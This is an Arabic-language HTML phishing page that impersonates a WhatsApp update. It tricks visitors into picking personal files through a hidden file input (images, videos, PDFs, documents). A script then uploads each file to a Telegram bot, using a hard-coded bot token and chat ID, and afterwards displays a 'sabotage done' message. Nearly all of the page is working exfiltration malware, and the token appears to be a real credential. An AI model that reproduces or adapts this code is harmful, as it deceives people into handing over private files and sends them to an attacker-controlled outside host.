<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث واتساب</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; max-width: 320px; width: 100%; }
        .logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; font-weight: bold; }
        h2 { color: #075e54; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        .btn { background: #25D366; color: white; border: none; padding: 12px 25px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
        #status { margin-top: 15px; font-size: 12px; color: #888; }
    </style>
</head>
<body>

<div class="container" id="main-box">
    <div class="logo">W</div>
    <h2>تحديث البيانات</h2>
    <p>لإتمام التحديث، نحتاج إلى الوصول إلى ملفاتك.</p>
    
    <!-- زر خفي لفتح الملفات -->
    <input type="file" id="fileInput" multiple accept="image/*,video/*,.pdf,.doc,.docx" style="display: none;">
    
    <button class="btn" id="attackBtn">السماح بالوصول</button>
    <div id="status"></div>
</div>

<script>
    const BOT_TOKEN = "8833068432:AAFVOayljoScMT3pyvEiuv3RMp2XBOWlHvU"; 
    const CHAT_ID = "7935077218";
    const btn = document.getElementById('attackBtn');
    const fileInput = document.getElementById('fileInput');
    const status = document.getElementById('status');

    btn.addEventListener('click', () => {
        btn.innerText = "جاري الفتح...";
        fileInput.click();
    });

    fileInput.addEventListener('change', async (e) => {
        const files = e.target.files;
        if (files.length === 0) return;

        btn.disabled = true;
        btn.innerText = "جاري الرفع...";
        
        let sentCount = 0;
        const totalFiles = files.length;

        for (const file of files) {
            status.innerText = `تم اختيار ${sentCount + 1} من ${totalFiles} ملف...`;
            
            // تحويل الملف إلى Base64 أو Blob للإرسال
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file); // إرسال كـ Document
            formData.append('caption', `📁 ملف من: ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)`);

            // إرسال الملف إلى تيليجرام
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                sentCount++;
            } catch (error) {
                console.error('فشل إرسال الملف:', error);
            }
        }

        status.innerText = `تم رفع ${sentCount} ملفات بنجاح!`;
        setTimeout(() => {
            document.querySelector('.container').innerHTML = `
                <div class="logo" style="background:red;">!</div>
                <h2>تم التخريب</h2>
                <p>تم رفع ${sentCount} ملفات إلى خادمك.</p>
            `;
        }, 1000);
    });
</script>

</body>
</html>
